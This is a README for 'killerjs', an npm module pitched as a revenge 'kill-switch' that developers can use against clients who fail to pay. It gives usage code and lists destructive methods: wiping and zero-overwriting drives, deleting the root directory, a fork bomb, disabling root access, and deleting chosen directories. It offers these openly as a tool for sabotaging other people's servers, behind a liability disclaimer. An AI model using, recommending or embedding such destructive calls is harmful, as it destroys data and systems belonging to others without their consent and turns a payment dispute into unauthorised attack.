# KillerJS

Kills any *Server* in an Instant, This module Doesn't Kill Server Process but Kills the entire Functioning of the Server. It's essentially a kill-switch for those scammers out there who get the work done by Developers but Don't pay or Block. 

### Use it with Caution

I'm not responsible if you destroy your PC or Somehting, It's just made for the Developers who get scammed by Clients and Hence can destroy their Server for The Damage Caused to them and their Code.

Please Use it with Caution and I do-not recommend using it on your own pc or even a Server. Try it on a Virtual Machine, if you want to but Never Use it with your Main Computer.

### How It Works?
- Import It
- Run it as a Function or Use the Set of Methods Below
- Returns a Promise
- Use the JavaScript Then function to Know if the Server has been Killed or not.
- Use the JavaScript Catch function to Check What error occured.

### The Code
```javascript
var killer = require('killerjs')
killer().then((status) => {
    console.log(status) // Killed the Server
}).catch((err) => {
    console.log(err) // Insufficent Permissions (Run with Root.)
})
```
### Methods
```javascript
    killer.destroyRoot() // destroys the root dir
    killer.format() // formats the HDD
    killer.overWrite() // overWrites the HDD With Zeros
    killer.implode() // implodes the Drive
    killer.wipe() // wipes the harddrive
    killer.forkBomb() // a Fork Bomb
    killer.disableRoot() // disables root access for all
    killer.destroyProject() // destroys your Project dir
    killer.destroyADir('AddTheDirectoryToKillHere') // kills that following dir
```

### Extras

* ✨ [pc-stats](https://github.com/Dakssh/node-pc-stats) - PC Stats API
* 🚩 [employee-churn](https://github.com/Dakssh/EmployeeChurn) - A Deep Neural Network for Calculating Churn
* 🌎 [node-FileScraper](https://github.com/Dakssh/node-FileScraper) - A File Scraper Which Scrapes Files for you

### License

Licensed Under the MIT License to Daksh Miglani